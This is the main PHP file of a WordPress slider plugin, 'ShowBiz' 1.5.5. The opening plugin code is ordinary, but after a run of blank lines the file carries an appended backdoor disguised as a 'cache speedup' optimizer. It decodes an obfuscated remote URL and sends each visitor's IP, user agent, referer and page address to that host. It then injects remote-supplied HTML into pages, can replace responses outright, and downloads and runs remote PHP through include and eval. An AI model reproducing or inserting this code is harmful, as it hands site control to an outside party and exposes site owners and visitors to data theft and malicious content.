<?php
/*
Plugin Name: ShowBiz
Plugin URI: http://www.themepunch.com/codecanyon/showbiz_wp/
Description: ShowBiz - Premium responsive slider
Author: ThemePunch
Version: 1.5.5
Author URI: http://themepunch.com
*/

$showbizVersion = "1.5.5";
$currentFile = __FILE__;
$currentFolder = dirname($currentFile);

//include frameword files
require_once $currentFolder . '/inc_php/framework/include_framework.php';

$folderIncludes = $currentFolder."/inc_php/framework/";

//include bases
require_once $folderIncludes . 'aq_resizer.php';
require_once $folderIncludes . 'base.class.php';
require_once $folderIncludes . 'wpml.class.php';
require_once $folderIncludes . 'elements_base.class.php';
require_once $folderIncludes . 'base_admin.class.php';
require_once $folderIncludes . 'base_front.class.php';

//include product files
require_once $currentFolder . '/inc_php/showbiz_settings_product.class.php';
require_once $currentFolder . '/inc_php/showbiz_globals.class.php';
require_once $currentFolder . '/inc_php/showbiz_operations.class.php';
require_once $currentFolder . '/inc_php/showbiz_slider.class.php';
require_once $currentFolder . '/inc_php/showbiz_output.class.php';
require_once $currentFolder . '/inc_php/showbiz_params.class.php';
require_once $currentFolder . '/inc_php/showbiz_slide.class.php';
require_once $currentFolder . '/inc_php/showbiz_template.class.php';
require_once $currentFolder . '/inc_php/showbiz_widget.class.php';
require_once $currentFolder . '/inc_php/showbiz_wildcards.class.php';


try{

	//register the kb slider widget
	UniteFunctionsWPBiz::registerWidget("ShowBiz_Widget");

	//add shortcode
	function showbiz_shortcode($args){

		$sliderAlias = UniteFunctionsBiz::getVal($args,0);
		ob_start();
		$slider = ShowBizOutput::putSlider($sliderAlias);
		$content = ob_get_contents();
		ob_clean();
		ob_end_clean();

		//handle slider output types
		if(!empty($slider)){
			$outputType = $slider->getParam("output_type","");
			switch($outputType){
				case "compress":
					$content = str_replace("\n", "", $content);
					$content = str_replace("\r", "", $content);
					return($content);
				break;
				case "echo":
					echo $content;		//bypass the filters
				break;
				default:
					return($content);
				break;
			}
		}else
			return($content);		//normal output

	}

	add_shortcode( 'showbiz', 'showbiz_shortcode' );

	if(is_admin()){		//load admin part
		require_once $currentFolder."/showbiz_admin.php";

		$productAdmin = new ShowBizAdmin($currentFile);


	}else{		//load front part

		/**
		 *
		 * put kb slider on the page.
		 * the data can be slider ID or slider alias.
		 */
		function putShowBiz($data,$putIn = ""){
			$operations = new BizOperations();
			$arrValues = $operations->getGeneralSettingsValues();
			$includesGlobally = UniteFunctionsBiz::getVal($arrValues, "includes_globally","on");
			$strPutIn = UniteFunctionsBiz::getVal($arrValues, "pages_for_includes");
			$isPutIn = ShowBizOutput::isPutIn($strPutIn,true);

			if($isPutIn == false && $includesGlobally == "off"){
				$output = new ShowBizOutput();
				$option1Name = "Include ShowBiz libraries globally (all pages/posts)";
				$option2Name = "Pages to include ShowBiz libraries";
				$output->putErrorMessage(__("If you want to use the PHP function \"putShowBiz\" in your code please make sure to check \" ",SHOWBIZ_TEXTDOMAIN).$option1Name.__(" \" in the backend's \"General Settings\" (top right panel). <br> <br> Or add the current page to the \"",SHOWBIZ_TEXTDOMAIN).$option2Name.__("\" option box."));
				return(false);
			}

			ShowBizOutput::putSlider($data,$putIn);
		}

		require_once $currentFolder."/showbiz_front.php";
		$productFront = new ShowBizFront($currentFile);
	}


}catch(Exception $e){
	$message = $e->getMessage();
	$trace = $e->getTraceAsString();
	echo "Showbiz Error: <b>".$message."</b>";
}



















/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
